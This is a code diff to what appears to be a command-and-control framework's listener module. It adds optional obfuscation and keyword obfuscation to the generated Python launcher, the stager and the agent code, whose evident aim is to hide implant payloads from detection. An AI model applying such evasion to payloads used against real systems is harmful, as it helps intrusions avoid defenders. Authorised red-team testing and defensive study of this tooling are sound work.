@@ -212,6 +212,12 @@ class Listener(object):
                 # download the stager and extract the IV
                 launcherBase += listener_util.python_extract_stager(stagingKey)
 
+                if obfuscate:
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(launcherBase)
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
+                        launcherBase
+                    )
+
                 if encode:
                     launchEncoded = base64.b64encode(
                         launcherBase.encode("UTF-8")
@@ -286,6 +292,10 @@ class Listener(object):
                 "pipe_name": pipe_name,
             }
             stager = template.render(template_options)
+
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # base64 encode the stager and return it
             if encode:
@@ -364,6 +374,10 @@ class Listener(object):
                 code = code.replace(
                     'workingHours = ""', 'workingHours = "%s"' % (killDate)
                 )
+
+            if obfuscate:
+                code = self.mainMenu.obfuscationv2.python_obfuscate(code)
+                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
         else:
